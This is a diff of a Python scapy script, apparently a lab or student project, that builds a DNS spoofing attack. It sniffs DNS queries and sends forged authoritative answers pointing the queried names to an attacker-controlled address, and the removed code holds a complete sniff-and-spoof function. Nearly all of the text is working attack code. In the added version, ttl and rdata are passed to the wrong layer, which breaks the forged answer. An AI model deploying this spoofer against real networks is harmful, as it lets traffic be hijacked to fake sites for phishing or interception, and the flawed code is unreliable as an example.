@@ -1,8 +1,11 @@
 from scapy.all import *
 # import scanning as scan
 from sys import argv
+import socket
 
-# DNS spoofing will make use of ARP spoofing in guispoofing.py
+# DNS spoofing will make use of ARP spoofing
+from scapy.layers.dns import DNSQR, UDP, DNS, DNSRR
+from scapy.layers.inet import IP, TCP
 
 """ kan in een losse functie gezet worden, maar eerst kijken of het zo werkt
 def alter_packet(d_pkt):
@@ -24,16 +27,42 @@ def sniff_DNSpackets():
             # alter_packet(DNSpkt)
             dstIP = DNSpkt.getlayer(IP).dst
             srcIP = DNSpkt.getlayer(IP).src
-            # mogelijk checken of het altijd UDP verkeer of ook TCP verkeer is
-            dstPort = DNSpkt.getlayer(UDP).dport
-            srcPort = DNSpkt.getlayer(UDP).sport
+
+            # check if it is UDP of TCP traffic
+            if DNSpkt.haslayer(UDP):
+                dstPort = DNSpkt.getlayer(UDP).dport
+                srcPort = DNSpkt.getlayer(UDP).sport
+            elif DNSpkt.haslayer(TCP):
+                dstPort = DNSpkt.getlayer(TCP).dport
+                srcPort = DNSpkt.getlayer(TCP).sport
+
+            dnsId = DNSpkt.getlayer(DNS).id
+            dnsQd = DNSpkt.getlayer(DNS).qd
+
+            # retrieve the name of the website that is searched for
+            queryName = DNSpkt.getlayer(DNS).qd.qname
+
+            # TODO: create website and fill IP address in below
+            my_site = '192.168.56.103'
+
+            # create DNS response packet in the form of IP()/UDP()/DNS()
+
+            spoof_response = IP(dst=srcIP, src=dstIP)/\
+                             UDP(dport=srcPort, sport=dstPort)/\
+                             DNS(id=dnsId, qd=dnsQd, aa=1, qr=1, an=DNSRR(rrname=queryName), ttl=20, rdata=my_site)
+
+            send(spoof_response)
+
+
+
+"""def return_packet():
+  
+"""
 
 
 
 
 
-def return_packet():
-    Kees = "Kut"
 
 
 
@@ -52,21 +81,3 @@ def return_packet():
 
 
 
-
-
-
-
-
-
-
-# testing examples
-def dns_spoof(pkt):
-    redirect_to = '192.168.56.103'
-    if pkt.haslayer(DNSQR): # DNS question record
-        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
-                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
-                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
-                      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
-        send(spoofed_pkt)
-        print 'Sent:', spoofed_pkt.summary()
-    sniff(filter='udp port 53', iface='wlan0', store=0, prn=dns_spoof)
